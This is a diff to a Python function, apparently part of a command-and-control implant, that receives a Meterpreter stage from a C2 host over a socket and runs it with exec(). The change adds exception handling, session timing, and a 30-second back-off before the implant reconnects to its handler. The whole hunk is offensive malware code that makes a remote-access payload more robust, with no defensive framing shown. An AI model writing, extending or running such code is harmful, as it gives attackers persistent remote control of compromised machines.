@@ -387,12 +387,34 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
 
             # Execute the stage — the stage expects 's' (the socket)
             # to be available in its namespace.
-            exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
+            _t0 = time.monotonic()
+            try:
+                exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
+            except SystemExit as e:
+                log.warning("Meterpreter stage called sys.exit(%s)", e.code)
+            except BaseException as e:
+                log.error("Meterpreter stage exception: %s: %s", type(e).__name__, e)
 
-            # exec() blocks for the session lifetime.  When it returns
-            # the session is dead — mark FAILED so the main loop
-            # (landnav.py) re-enters the C2 cascade.
-            log.warning("Meterpreter session ended — marking FAILED for re-cascade")
+            elapsed = time.monotonic() - _t0
+
+            # exec() should block for the session lifetime.  When it
+            # returns the session is dead — mark FAILED so the main
+            # loop re-enters the C2 cascade.
+            if elapsed < 5:
+                # Stage died almost immediately — something is wrong.
+                # Back off to avoid hammering the handler in a tight loop.
+                log.warning("Meterpreter session died after %.1fs — "
+                            "backing off 30s before retry", elapsed)
+                _current_state = EgressState.FAILED
+                try:
+                    s.close()
+                except OSError:
+                    pass
+                time.sleep(30)
+                return True
+
+            log.warning("Meterpreter session ended after %.0fs — "
+                        "marking FAILED for re-cascade", elapsed)
             _current_state = EgressState.FAILED
             return True
 
